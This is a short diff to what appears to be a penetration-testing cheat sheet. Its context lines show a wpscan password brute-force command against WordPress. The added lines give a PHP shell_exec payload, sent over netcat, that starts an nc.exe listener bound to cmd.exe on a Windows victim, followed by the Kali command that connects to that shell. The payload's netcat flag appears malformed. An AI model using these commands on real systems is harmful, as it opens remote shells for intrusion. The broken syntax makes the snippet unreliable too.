@@ -81,5 +81,12 @@ wpscan --url http://<targetip> --wordlist wordlist.txt --username example_userna
 http://....../wp-admin
 http://...../wp-content/uploads/2017/10/file.png
 
+----------------------------------------------
+#Windows Command Execution (RFI exploit)
+
+#Connect via netcat to victim (nc -nv <[IP]> <[PORT]>) and send 
+<?php echo shell_exec("nc.exe -nlvp 4444 -C:\Windows\System32\cmd.exe");?>
+# on kali call the shell
+nc -nv 10.11.25.59 4444
 
 
